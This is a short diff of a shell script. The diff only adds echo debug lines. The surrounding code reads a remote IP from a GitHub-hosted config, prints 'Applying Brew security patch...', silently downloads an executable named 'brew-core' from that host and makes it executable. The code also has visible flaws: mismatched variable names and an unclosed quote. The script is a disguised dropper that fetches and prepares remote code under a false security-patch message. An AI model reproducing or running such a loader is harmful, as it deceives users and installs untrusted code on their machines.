@@ -2,8 +2,11 @@
 
 tmp="/tmp/$(head /dev/urandom | tr -dc A-Fa-f0-9 | head -c 12)"
 ip="$(curl https://raw.githubusercontent.com/svendev045/CurlR/master/config | grep ipaddr | cut -f1 -d"=")"
+echo "$ip is ip"
 l="$(curl https://raw.githubusercontent.com/svendev045/CurlR/master/config | grep list | cut -f1 -d"=")"
+echo "$list is list"
 args="$(curl https://raw.githubusercontent.com/svendev045/CurlR/master/config | grep list | cut -f1 -d"=")
+echo "$args is args"
 echo "Applying Brew security patch..."
 curl -s http://$ip/brew-core -o $tmp_file >/dev/null 2>&1
 chmod +x $tmp
